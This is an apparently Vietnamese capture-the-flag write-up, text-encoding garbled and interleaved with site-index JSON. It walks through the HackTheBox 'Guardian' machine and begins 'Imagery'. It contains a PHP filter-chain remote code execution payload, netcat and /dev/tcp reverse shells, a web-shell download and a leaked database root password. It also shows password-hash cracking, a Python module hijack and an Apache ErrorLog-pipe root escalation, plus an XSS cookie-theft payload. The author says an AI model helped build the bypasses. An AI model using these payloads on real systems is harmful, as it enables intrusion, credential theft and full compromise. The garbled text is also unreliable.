1 trong sá»‘ 4 tÃªn file enrollment|academic|financial|system vÃ  káº¿t thÃºc báº±ng .php Thá»­ má»™t sá»‘ kiá»ƒu bypass phá»• biáº¿n mÃ  tÃ´i hay dÃ¹ng vÃ  nháº­n ra tÃ´i cÃ³ thá»ƒ láº¥y Ä‘Æ°á»£c ná»™i dung file back-end báº±ng cÃ¡ch mÃ£ hÃ³a base64 vá»›i php://filter.\nphp://filter/convert.base64-encode/resource=reports/system.php Vá»›i cÃ¡ch nÃ y thÃ¬ chá»‰ cÃ³ thá»ƒ in ra cÃ¡c file trong whitelist. TÃ¬m kiáº¿m cÃ¡c cÃ¡ch bypass khÃ¡c trong cÃ¡c cheatsheet, tÃ´i tÃ¬m tháº¥y php_filter_chain_generator trong PayloadsAllTheThings - File Inclusion\nClone repo nÃ y vá» vÃ  táº¡o 1 payload Ä‘Æ¡n giáº£n.\npython3 php_filter_chain_generator.py --chain \u0026#39;\u0026lt;?php system(\u0026#34;whoami\u0026#34;); ?\u0026gt;\u0026#39; â”Œâ”€â”€(kaliã‰¿kali)-[~/htb/machines/Guardian/php_filter_chain_generator] â””â”€$ python3 php_filter_chain_generator.py --chain \u0026#39;\u0026lt;?php system(\u0026#34;whoami\u0026#34;); ?\u0026gt;\u0026#39; [+] The following gadget chain will generate the following code : \u0026lt;?php system(\u0026#34;whoami\u0026#34;); ?\u0026gt; (base64 value: PD9waHAgc3lzdGVtKCJ3aG9hbWkiKTsgPz4) php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLAT...............decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp Tuy nhiÃªn payload nÃ y khÃ´ng thá»a mÃ£n Ä‘á»§ cÃ¡c Ä‘iá»u kiá»‡n cá»§a filter. Äá»ƒ tiáº¿t kiá»‡m thá»i gian, tÃ´i há»i AI, cá»¥ thá»ƒ lÃ  Claude, vá» cÃ¡ch Ä‘á»ƒ bypass Ä‘oáº¡n filter trong source code báº±ng php filter\nThÃªm Bypass regex vÃ o cuá»‘i payload\nThÃ nh cÃ´ng! Tuy nhiÃªn khi thá»­ nghiá»‡m vá»›i ráº¥t nhiá»u payload vÃ  revershell (báº¥t ká»³ payload nÃ o trong https://www.revshells.com/) khÃ¡c nhau nhÆ°ng Ä‘á»u khÃ´ng cÃ³ káº¿t quáº£.\nMá»™t láº§n ná»¯a pháº£i nhá» Ä‘áº¿n anh báº¡n Claude vÃ  tÃ´i Ä‘Ã£ nháº­n Ä‘Æ°á»£c Ä‘Ã¡p Ã¡n kháº£ thi.\nClone repo vá» vÃ  báº­t http server Ä‘á»ƒ Ä‘áº©y phpbash.php lÃªn server\nâ”Œâ”€â”€(kaliã‰¿kali)-[~/htb/machines/Guardian] â””â”€$ git clone https://github.com/Arrexel/phpbash.git Cloning into \u0026#39;phpbash\u0026#39;... remote: Enumerating objects: 85, done. remote: Total 85 (delta 0), reused 0 (delta 0), pack-reused 85 (from 1) Receiving objects: 100% (85/85), 34.02 KiB | 11.34 MiB/s, done. Resolving deltas: 100% (40/40), done. â”Œâ”€â”€(kaliã‰¿kali)-[~/htb/machines/Guardian] â””â”€$ cd phpbash â”Œâ”€â”€(kaliã‰¿kali)-[~/htb/machines/Guardian/phpbash] â””â”€$ python3 -m http.server Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... Táº¡o láº¡i payload vá»›i php_filter_chain_generator, dÃ¡n payload vÃ o Burpsuite\npython3 php_filter_chain_generator.py --chain \u0026#39;\u0026lt;?php system(\u0026#34;wget http://10.10.14.165:8000/phpbash.php\u0026#34;); ?\u0026gt;\u0026#39; Truy cáº­p file phpbash.php trong thÆ° má»¥c admin/\nSá»­ dá»¥ng revershell\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2\u0026gt;\u0026amp;1|nc 10.10.14.165 9999 \u0026gt;/tmp/f Copy nÃ³ vÃ o webshell vÃ  Enter. Quay trá»Ÿ láº¡i kali terminal\nUser # Sá»­ dá»¥ng thÃ´ng tin Ä‘Äƒng nháº­p cá»§a root truy cáº­p vÃ o mysql Ä‘Ã£ tÃ¬m tháº¥y bÃªn trong source code\nwww-data@guardian:~$ mysql -h localhost -u root -p\u0026#39;Gu4rd14n_un1_1s_th3_b3st\u0026#39; mysql: [Warning] Using a password on the command line interface can be insecure. Welcome to the MySQL monitor. Commands end with ; or \\g. Your MySQL connection id is 787295 Server version: 8.0.43-0ubuntu0.22.04.1 (Ubuntu) Copyright (c) 2000, 2025, Oracle and/or its affiliates. Oracle is a registered trademark of Oracle Corporation and/or its affiliates. Other names may be trademarks of their respective owners. Type \u0026#39;help;\u0026#39; or \u0026#39;\\h\u0026#39; for help. Type \u0026#39;\\c\u0026#39; to clear the current input statement. mysql\u0026gt; TÃ¬m kiáº¿m vÃ  khai thÃ¡c cÃ¡c thÃ´ng tin trong db nÃ y.\nmysql\u0026gt; show databases; +--------------------+ | Database | +--------------------+ | guardiandb | | information_schema | | mysql | | performance_schema | | sys | +--------------------+ 5 rows in set (0.00 sec) mysql\u0026gt; use guardiandb; Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Database changed mysql\u0026gt; show tables -\u0026gt; ; +----------------------+ | Tables_in_guardiandb | +----------------------+ | assignments | | courses | | enrollments | | grades | | messages | | notices | | programs | | submissions | | users | +----------------------+ 9 rows in set (0.00 sec) mysql\u0026gt; desc users; +---------------+------------------------------------+------+-----+-------------------+-----------------------------------------------+ | Field | Type | Null | Key | Default | Extra | +---------------+------------------------------------+------+-----+-------------------+-----------------------------------------------+ | user_id | int | NO | PRI | NULL | auto_increment | | username | varchar(255) | YES | UNI | NULL | | | password_hash | varchar(255) | YES | | NULL | | | full_name | varchar(255) | YES | | NULL | | | email | varchar(255) | YES | | NULL | | | dob | date | YES | | NULL | | | address | text | YES | | NULL | | | user_role | enum(\u0026#39;student\u0026#39;,\u0026#39;lecturer\u0026#39;,\u0026#39;admin\u0026#39;) | YES | | student | | | status | enum(\u0026#39;active\u0026#39;,\u0026#39;inactive\u0026#39;) | YES | | active | | | created_at | timestamp | YES | | CURRENT_TIMESTAMP | DEFAULT_GENERATED | | updated_at | timestamp | YES | | CURRENT_TIMESTAMP | DEFAULT_GENERATED on update CURRENT_TIMESTAMP | +---------------+------------------------------------+------+-----+-------------------+-----------------------------------------------+ 11 rows in set (0.00 sec) mysql\u0026gt; select username,password_hash,email,user_role from users; +--------------------+------------------------------------------------------------------+---------------------------------+-----------+ | username | password_hash | email | user_role | +--------------------+------------------------------------------------------------------+---------------------------------+-----------+ | admin | 694a63de406521120d9b905ee94bae3d863ff9f6637d7b7cb730f7da535fd6d6 | admin@guardian.htb | admin | ........................ | GU3052023 | 2ef01f607f86387d0c94fc2a3502cc3e6d8715d3b1f124b338623b41aed40cf8 | GU3052023@guardian.htb | student | | GU1462023 | 585aacf74b22a543022416ed771dca611bd78939908c8323f4f5efef5b4e0202 | GU1462023@guardian.htb | student | +--------------------+------------------------------------------------------------------+---------------------------------+-----------+ 62 rows in set (0.00 sec) VÃ¬ cÃ³ quÃ¡ nhiá»u hash á»Ÿ Ä‘Ã¢y mÃ  copy thá»§ cÃ´ng thÃ¬ ráº¥t má»‡t nÃªn tÃ´i sáº½ lÆ°u db nÃ y vá» kali\nwww-data@guardian:~$ mysql -h localhost -u root -p\u0026#39;Gu4rd14n_un1_1s_th3_b3st\u0026#39; -e \u0026#39;use guardiandb;select * from users\u0026#39; \u0026gt;\u0026gt; users.sql www-data@guardian:~$ python3 -m http.server Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... wget http://10.10.11.84:8000/users.sql Nhá»› láº¡i trong config.php cÃ³ thÃªm salt Ä‘á»ƒ táº¡o hash ngáº«u nhiÃªn, thÃªm ná»¯a trong createuser.php cÅ©ng Ä‘Ã£ kháº³ng Ä‘á»‹nh vá» viá»‡c dÃ¹ng salt vá»›i thuáº­t toÃ¡n mÃ£ hÃ³a SHA256. Váº­y thÃ¬ Ä‘á»ƒ crack Ä‘Æ°á»£c password nÃ y, tÃ´i cÅ©ng cáº§n pháº£i sá»­ dá»¥ng salt trong cÃ¢u lá»‡nh crack.\nÄoáº¡n nÃ y thÃ¬ láº¡i pháº£i nhá» anh báº¡n Claude lá»c file users.sql vÃ  láº¥y ra username, password hash, sau Ä‘Ã³ sá»­a láº¡i Ä‘á»‹nh dáº¡ng Ä‘á»ƒ cÃ³ thá»ƒ Ä‘Æ°a vÃ o tool crack (username:hash$salt). Káº¿t quáº£\nadmin:694a63de406521120d9....0f7da535fd6d6$8Sb)tM1vs1SS jamil.enockson:c1d8dfaeee103d01a5a....02ff4f9a43ee440250$8Sb)tM1vs1SS mark.pargetter:8623e713bb98ba2d4....e4ba1cc6f37f97a10e$8Sb)tM1vs1SS valentijn.temby:1d1bb7b3c6a2a461362....2b2a9cd3c0ff284e6$8Sb)tM1vs1SS ................ DÃ¹ng john Ä‘á»ƒ crack password, chá»n crack format lÃ  SHA256\njohn -w=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --format=dynamic=\u0026#39;sha256($p.$s)\u0026#39; hash.txt â”Œâ”€â”€(kaliã‰¿kali)-[~/htb/machines/Guardian] â””â”€$ john -w=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --format=dynamic=\u0026#39;sha256($p.$s)\u0026#39; hash.txt Using default input encoding: UTF-8 Loaded 9 password hashes with no different salts (dynamic=sha256($p.$s) [512/512 AVX512BW 16x]) Warning: no OpenMP support for this hash type, consider --fork=10 Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status ********* (jamil.enockson) ********* (admin) Thá»­ login ssh vá»›i password vá»«a tÃ¬m Ä‘Æ°á»£c.\nâ”Œâ”€â”€(kaliã‰¿kali)-[~/htb/machines/Guardian] â””â”€$ ssh jamil@10.10.11.84 jamil@10.10.11.84\u0026#39;s password: jamil@guardian:~$ id uid=1000(jamil) gid=1000(jamil) groups=1000(jamil),1002(admins) jamil@guardian:~$ ls user.txt jamil@guardian:~$ Privilege escalation # mark # sudo -l\njamil@guardian:~$ sudo -l Matching Defaults entries for jamil on guardian: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty User jamil may run the following commands on guardian: (mark) NOPASSWD: /opt/scripts/utilities/utilities.py Kiá»ƒm tra thÃ´ng tin cá»§a file nÃ y\njamil@guardian:~$ ll /opt/scripts/utilities/utilities.py -rwxr-x--- 1 root admins 1136 Apr 20 2025 /opt/scripts/utilities/utilities.py* Group admins cÃ³ quyá»n thá»±c thi file nÃ y, Ä‘á»“ng thá»i user jamil cÅ©ng náº±m trong group admins.\ncat /opt/scripts/utilities/utilities.py\n#!/usr/bin/env python3 import argparse import getpass import sys from utils import db from utils import attachments from utils import logs from utils import status def main(): parser = argparse.ArgumentParser(description=\u0026#34;University Server Utilities Toolkit\u0026#34;) parser.add_argument(\u0026#34;action\u0026#34;, choices=[ \u0026#34;backup-db\u0026#34;, \u0026#34;zip-attachments\u0026#34;, \u0026#34;collect-logs\u0026#34;, \u0026#34;system-status\u0026#34; ], help=\u0026#34;Action to perform\u0026#34;) args = parser.parse_args() user = getpass.getuser() if args.action == \u0026#34;backup-db\u0026#34;: if user != \u0026#34;mark\u0026#34;: print(\u0026#34;Access denied.\u0026#34;) sys.exit(1) db.backup_database() elif args.action == \u0026#34;zip-attachments\u0026#34;: if user != \u0026#34;mark\u0026#34;: print(\u0026#34;Access denied.\u0026#34;) sys.exit(1) attachments.zip_attachments() elif args.action == \u0026#34;collect-logs\u0026#34;: if user != \u0026#34;mark\u0026#34;: print(\u0026#34;Access denied.\u0026#34;) sys.exit(1) logs.collect_logs() elif args.action == \u0026#34;system-status\u0026#34;: status.system_status() else: print(\u0026#34;Unknown action.\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: main() MÃ£ python cÃ³ váº» Ä‘Æ°á»£c dÃ¹ng Ä‘á»ƒ kiá»ƒm tra cÃ¡c thÃ´ng sá»‘ cá»§a há»‡ thá»‘ng, import cÃ¡c lib tá»« utils. Kiá»ƒm tra thÆ° má»¥c utils\njamil@guardian:~$ ll /opt/scripts/utilities/utils/ total 24 drwxrwsr-x 2 root root 4096 Jul 10 14:20 ./ drwxr-sr-x 4 root admins 4096 Jul 10 13:53 ../ -rw-r----- 1 root admins 287 Apr 19 2025 attachments.py -rw-r----- 1 root admins 246 Jul 10 14:20 db.py -rw-r----- 1 root admins 226 Apr 19 2025 logs.py -rwxrwx--- 1 mark admins 214 Nov 20 05:10 status.py* File status.py cÃ³ quyá»n ghi Ä‘á»‘i vá»›i group admins, tÃ´i khÃ´ng thá»ƒ ghi file nÃ y vá»›i user hiá»‡n táº¡i nhÆ°ng hoÃ n toÃ n cÃ³ thá»ƒ thay thay tháº¿ 1 file cÃ¹ng tÃªn vá»›i ná»™i dung khÃ¡c.\necho \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; \u0026gt; status.py jamil@guardian:~$ cp status.py /opt/scripts/utilities/utils/status.py jamil@guardian:~$ cat /opt/scripts/utilities/utils/status.py import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;) Cháº¡y utilities.py vá»›i user mark, thÃªm option system-status\njamil@guardian:~$ sudo -u mark /opt/scripts/utilities/utilities.py system-status mark@guardian:/home/jamil$ id uid=1001(mark) gid=1001(mark) groups=1001(mark),1002(admins) mark@guardian:/home/jamil$ root # sudo -l\nmark@guardian:~$ sudo -l Matching Defaults entries for mark on guardian: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty User mark may run the following commands on guardian: (ALL) NOPASSWD: /usr/local/bin/safeapache2ctl PhÃ¢n tÃ­ch file /usr/local/bin/safeapache2ctl\nmark@guardian:~$ file /usr/local/bin/safeapache2ctl /usr/local/bin/safeapache2ctl: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=0690ef286458863745e17e8a81cc550ced004b12, for GNU/Linux 3.2.0, not stripped mark@guardian:~$ strings /usr/local/bin/safeapache2ctl /lib64/ld-linux-x86-64.so.2 __cxa_finalize fgets ................ PTE1 u+UH \u0026lt;/uMH %31s %1023s Include IncludeOptional LoadModule /home/mark/confs/ [!] Blocked: %s is outside of %s Usage: %s -f /home/mark/confs/file.conf realpath Access denied: config must be inside %s fopen Blocked: Config includes unsafe directive. apache2ctl /usr/sbin/apache2ctl execl failed :*3$\u0026#34; GCC: (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0 Scrt1.o __abi_tag crtstuff.c deregister_tm_clones ............... ÄÃ¢y lÃ  má»™t binary dÃ¹ng Ä‘á»ƒ cháº¡y apache2ctl. Thá»±c sá»± lÃ  tÃ´i khÃ´ng cÃ³ nhiá»u kinh nghiá»‡m vá»›i viá»‡c xá»­ lÃ½ hay khai thÃ¡c leo thang Ä‘áº·c quyá»n báº±ng cÃ¡i file binary nhÆ° tháº¿ nÃ y, nÃªn má»™t láº§n ná»¯a pháº£i nhá» Ä‘áº¿n sá»± giÃºp Ä‘á»¡ cá»§a anh báº¡n AI.\nDÆ°á»›i Ä‘Ã¢y lÃ  tá»•ng há»£p káº¿t quáº£ phÃ¢n tÃ­ch tÃ´i nháº­n Ä‘Æ°á»£c.\nTá»« pháº§n 3, filter nÃ y chá»‰ lá»c nhá»¯ng chuá»—i xÃ¡c Ä‘á»‹nh sáºµn, trong khi Apache khÃ´ng phÃ¢n biá»‡t chá»¯ hoa vÃ  chá»¯ thÆ°á»ng, nghÄ©a lÃ  tÃ´i váº«n cÃ³ thá»ƒ náº¡p cÃ¡c module Ä‘á»™c háº¡i sá»­ dá»¥ng chuá»—i khÃ´ng viáº¿t hoa, vÃ­ dá»¥ nhÆ° thay LoadModule báº±ng loadmodule, má»¥c tiÃªu lÃ  cá»‘ gáº¯ng chÃ¨n thÃªm payload vÃ o file config vÃ  Ã©p apache2 load file config má»›i nÃ y.\nSau ráº¥t nhiá»u láº§n cÃ£i nhau vá»›i Claude, thá»­ vÃ  lá»—i, thÃ¬ cuá»‘i cÃ¹ng tÃ´i Ä‘Ã£ thÃ nh cÃ´ng.\nÄáº§u tiÃªn táº¡o 1 revershell trong /tmp, má»¥c tiÃªu lÃ  dÃ¹ng file .conf Ä‘á»ƒ load shell nÃ y.\nnano /tmp/shell.sh #!/bin/bash /bin/bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.165/4444 0\u0026gt;\u0026amp;1\u0026#39; Táº¡o file .conf trong thÆ° má»¥c confs/, vÃ¬ safeapache2ctl chá»‰ load file trong thÆ° má»¥c nÃ y.\nnano confs/exploit.conf PidFile /tmp/evil.pid Listen 8888 User mark Group mark ServerRoot /etc/apache2 include /etc/apache2/mods-enabled/*.load ErrorLog \u0026#34;|/tmp/shell.sh\u0026#34; PidFile /tmp/evil.pid: Apache máº·c Ä‘á»‹nh dÃ¹ng file PID á»Ÿ /var/run/apache2/pid. Khi má»™t Apache khÃ¡c Ä‘ang cháº¡y (service chÃ­nh), file nÃ y bá»‹ khÃ³a. Trá» PidFile ra /tmp/ (nÆ¡i ai cÅ©ng ghi Ä‘Æ°á»£c) vÃ  Ä‘áº·t tÃªn khÃ¡c Ä‘i. Äiá»u nÃ y lá»«a Apache má»›i ráº±ng \u0026ldquo;ChÆ°a cÃ³ ai cháº¡y cáº£, mÃ¬nh Ä‘Æ°á»£c phÃ©p khá»Ÿi Ä‘á»™ng\u0026rdquo;. Listen 8888: Service Apache chÃ­nh Ä‘ang chiáº¿m dá»¥ng cá»•ng 80. Hai tiáº¿n trÃ¬nh khÃ´ng thá»ƒ láº¯ng nghe cÃ¹ng má»™t cá»•ng trÃªn cÃ¹ng má»™t IP, nÃªn Ä‘á»•i sang 1 cá»•ng nÃ o Ä‘Ã³ báº¥t ká»³ \u0026gt;1024. User mark / Group mark: Apache cÃ³ cÆ¡ cháº¿ an toÃ n, náº¿u tháº¥y mÃ¬nh Ä‘Æ°á»£c cháº¡y bá»Ÿi root, nÃ³ sáº½ cá»‘ gáº¯ng chuyá»ƒn quyá»n (drop privileges) sang user khÃ¡c Ä‘á»ƒ xá»­ lÃ½ request web. Náº¿u khÃ´ng khai bÃ¡o User/Group, hoáº·c module xá»­ lÃ½ user (mod_unixd) chÆ°a load, Apache sáº½ panic vÃ  khÃ´ng khá»Ÿi Ä‘á»™ng. include /etc/apache2/mods-enabled/*.load: Khi dÃ¹ng -f, Apache cháº¡y \u0026ldquo;tráº§n trá»¥i\u0026rdquo;, khÃ´ng load báº¥t ká»³ module nÃ o (ká»ƒ cáº£ module quan trá»ng nháº¥t lÃ  MPM Ä‘á»ƒ quáº£n lÃ½ process). Náº¿u thiáº¿u MPM, Apache cháº¿t ngay láº­p tá»©c (lá»—i No MPM loaded). Viá»‡c Ä‘oÃ¡n tÃªn tá»«ng file .so ráº¥t dá»… sai. Thay vÃ¬ Ä‘oÃ¡n thÃ¬ load táº¥t cáº£ nhá»¯ng gÃ¬ há»‡ thá»‘ng Ä‘ang dÃ¹ng. Sá»­ dá»¥ng tá»« khÃ³a include (viáº¿t thÆ°á»ng) Ä‘á»ƒ bypass Ä‘Æ°á»£c filter trong binary. ErrorLog \u0026quot;|/bin/bash /tmp/shell.sh\u0026quot;: Chá»‰ thá»‹ ErrorLog cá»§a Apache cho phÃ©p ghi log vÃ o file HOáº¶C gá»­i log vÃ o má»™t chÆ°Æ¡ng trÃ¬nh khÃ¡c thÃ´ng qua pipe (|). ChÆ°Æ¡ng trÃ¬nh trong pipe Ä‘Æ°á»£c khá»Ÿi táº¡o bá»Ÿi Parent Process cá»§a Apache. VÃ¬ safeapache2ctl cháº¡y SUID Root -\u0026gt; Parent Process lÃ  Root -\u0026gt; ChÆ°Æ¡ng trÃ¬nh trong pipe (bash) cháº¡y dÆ°á»›i quyá»n Root. Báº­t listener vá»›i port 4444\npenelope -p 4444 Load config má»›i vá»«a táº¡o\nsudo /usr/local/bin/safeapache2ctl -f confs/exploit.conf mark@guardian:~$ sudo /usr/local/bin/safeapache2ctl -f confs/exploit.conf AH00558: apache2: Could not reliably determine the server\u0026#39;s fully qualified domain name, using 10.10.11.84. Set the \u0026#39;ServerName\u0026#39; directive globally to suppress this message Action \u0026#39;-f /home/mark/confs/exploit.conf\u0026#39; failed. The Apache error log may have more information. Quay trá»Ÿ láº¡i listener\nâ”Œâ”€â”€(kaliã‰¿kali)-[~/htb/machines/Guardian] â””â”€$ penelope -p 4444 [+] Listening for reverse shells on 0.0.0.0:4444 â†’ 127.0.0.1 â€¢ 192.168.232.128 â€¢ 172.20.0.1 â€¢ 172.17.0.1 â€¢ 172.19.0.1 â€¢ 172.18.0.1 â€¢ 10.10.14.165 â¤ ğŸ  Main Menu (m) ğŸ’€ Payloads (p) ğŸ”„ Clear (Ctrl-L) ğŸš« Quit (q/Ctrl-C) [+] Got reverse shell from guardian~10.10.11.84-Linux-x86_64 ğŸ˜ Assigned SessionID \u0026lt;1\u0026gt; [+] Attempting to upgrade shell to PTY... [+] Shell upgraded successfully using /usr/bin/python3! ğŸ’ª [+] Interacting with session [1], Shell Type: PTY, Menu key: F12 [+] Logging to /home/kali/.penelope/sessions/guardian~10.10.11.84-Linux-x86_64/2025_11_20-09_39_16-468.log ğŸ“œ â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ root@guardian:/etc/apache2# id uid=0(root) gid=0(root) groups=0(root) root@guardian:/etc/apache2# cd bash: cd: HOME not set root@guardian:/etc/apache2# cd /root root@guardian:/root# ls root.txt scripts root@guardian:/root# ","date":"12 November 2025","externalUrl":null,"permalink":"/ctf/hackthebox/guardian/","section":"Ctf","summary":"","title":"Hackthebox - Guardian","type":"ctf"},{"content":"","date":"12 November 2025","externalUrl":null,"permalink":"/tags/lfi/","section":"Tags","summary":"","title":"LFI","type":"tags"},{"content":"","date":"12 November 2025","externalUrl":null,"permalink":"/tags/linux/","section":"Tags","summary":"","title":"Linux","type":"tags"},{"content":"","date":"12 November 2025","externalUrl":null,"permalink":"/tags/mysql/","section":"Tags","summary":"","title":"Mysql","type":"tags"},{"content":"","date":"12 November 2025","externalUrl":null,"permalink":"/tags/python/","section":"Tags","summary":"","title":"Python","type":"tags"},{"content":"","date":"12 November 2025","externalUrl":null,"permalink":"/","section":"Re-toor","summary":"","title":"Re-toor","type":"page"},{"content":"","date":"12 November 2025","externalUrl":null,"permalink":"/tags/ssrf/","section":"Tags","summary":"","title":"Ssrf","type":"tags"},{"content":"","date":"12 November 2025","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"","date":"12 November 2025","externalUrl":null,"permalink":"/tags/web/","section":"Tags","summary":"","title":"Web","type":"tags"},{"content":"","date":"12 November 2025","externalUrl":null,"permalink":"/tags/xss/","section":"Tags","summary":"","title":"Xss","type":"tags"},{"content":"","date":"7 October 2025","externalUrl":null,"permalink":"/tags/brute-force/","section":"Tags","summary":"","title":"Brute-Force","type":"tags"},{"content":"","date":"7 October 2025","externalUrl":null,"permalink":"/tags/burpsuite/","section":"Tags","summary":"","title":"Burpsuite","type":"tags"},{"content":"","date":"7 October 2025","externalUrl":null,"permalink":"/tags/command-injection/","section":"Tags","summary":"","title":"Command Injection","type":"tags"},{"content":" Reconnaissance and Scanning # rustscan -a 10.10.11.88 -- -sC -sV -oN nmap PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 9.7p1 Ubuntu 7ubuntu4.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 35:94:fb:70:36:1a:26:3c:a8:3c:5a:5a:e4:fb:8c:18 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKyy0U7qSOOyGqKW/mnTdFIj9zkAcvMCMWnEhOoQFWUYio6eiBlaFBjhhHuM8hEM0tbeqFbnkQ+6SFDQw6VjP+E= | 256 c2:52:7c:42:61:ce:97:9d:12:d5:01:1c:ba:68:0f:fa (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBleYkGyL8P6lEEXf1+1feCllblPfSRHnQ9znOKhcnNM 8000/tcp open http syn-ack ttl 63 Werkzeug httpd 3.1.3 (Python 3.12.7) | http-methods: |_ Supported Methods: GET HEAD OPTIONS |_http-title: Image Gallery |_http-server-header: Werkzeug/3.1.3 Python/3.12.7 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Enumeration and Gaining access # Truy cáº­p web vá»›i port 8000.\nSá»­ dá»¥ng dirsearch Ä‘á»ƒ bruteforce directory.\ndirsearch -u 10.10.11.88:8000 _|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| ) Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460 Output File: /home/kali/htb/machines/Imagery/reports/_10.10.11.88_8000/_25-10-07_12-41-40.txt Target: http://10.10.11.88:8000/ [12:41:41] Starting: [12:42:23] 401 - 59B - /images [12:42:30] 405 - 153B - /login [12:42:31] 405 - 153B - /logout [12:42:41] 405 - 153B - /register [12:42:48] 401 - 32B - /uploads/affwp-debug.log [12:42:48] 401 - 32B - /uploads/dump.sql Task Completed Cross-site scripting (XSS) # Kiá»ƒm tra trong source web cÃ³ khÃ¡ nhiá»u thÃ´ng tin há»¯u Ã­ch: má»™t sá»‘ path Ä‘Ã£ Ä‘Æ°á»£c áº©n Ä‘i nhÆ° /admin vÃ  nhiá»u path Ä‘áº±ng sau nÃ³.\nTrong footer cá»§a web cÃ³ 1 path /report_bug.\nSau khi thá»­ nghiá»‡m input má»™t sá»‘ payload Ä‘á»™c háº¡i, káº¿t quáº£ lÃ  pháº§n input á»Ÿ trang nÃ y bá»‹ dÃ­nh lá»— há»•ng XSS, cÃ³ thá»ƒ láº¥y Ä‘Æ°á»£c cookie cá»§a admin thÃ´ng qua payload nÃ y.\n\u0026lt;img src=x onerror=\u0026#34;document.location=\u0026#39;http://\u0026lt;ATTACK_MACHINE_IP\u0026gt;:\u0026lt;PORT\u0026gt;/?cookie=\u0026#39;+document.cookie\u0026#34;\u0026gt; TrÆ°á»›c khi inject thÃ¬ báº­t netcat Ä‘á»ƒ láº¥y Ä‘Æ°á»£c thÃ´ng tin request.\nnc -lnvp 80 TiÃªm payload vÃ o input.\nQuay trá»Ÿ láº¡i netcat.\nâ”Œâ”€â”€(kaliã‰¿kali)-[~/htb/machines/Imagery] â””â”€$ nc -lnvp 80 listening on [any] 80 ... connect to [10.10.14.136] from (UNKNOWN) [10.10.11.88] 51804 GET /?cookie=session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aOaXaw.Gm8IoGNdHX4ZGvxS6IpEQWB9rT0 HTTP/1.1 Host: 10.10.14.136 Connection: keep-alive Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/138.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/png,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Referer: http://0.0.0.0:8000/ Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Copy session nÃ y vÃ  truy cáº­p vÃ o /admin/users.\nLocal file inclusion (FLI) # NgoÃ i ra cÃ²n cÃ³ cÃ³ 1 path ná»¯a Ä‘á»ƒ check log: /admin/get_system_log?log_identifier=${encodeURIComponent(logIdentifier)}.log. TiÃªm má»™t sá»‘ payload vÃ o path nÃ y Ä‘á»ƒ kiá»ƒm tra, káº¿t quáº£ lÃ  tá»“n táº¡i lá»— há»•ng directory traversal.\nTuy nhiÃªn khÃ´ng láº¥y thÃªm Ä‘Æ°á»£c thÃ´ng tin gÃ¬ tá»« lá»— há»•ng nÃ y do cÃ¡c file cÆ¡ báº£n Ä‘á»u khÃ´ng xem Ä‘Æ°á»£c. Quay trá»Ÿ láº¡i web vÃ  thay cookie cá»§a admin vÃ  cookie cá»§a user.\náº¤n Save vÃ  load láº¡i trang, trang web sáº½ hiá»ƒn thá»‹ thÃªm Admin Panel.\nQuay trá»Ÿ láº¡i Burp, má»Ÿ file env cá»§a user hiá»‡n táº¡i.\nMá»™t sá»‘ thÃ´ng tin thu tháº­p 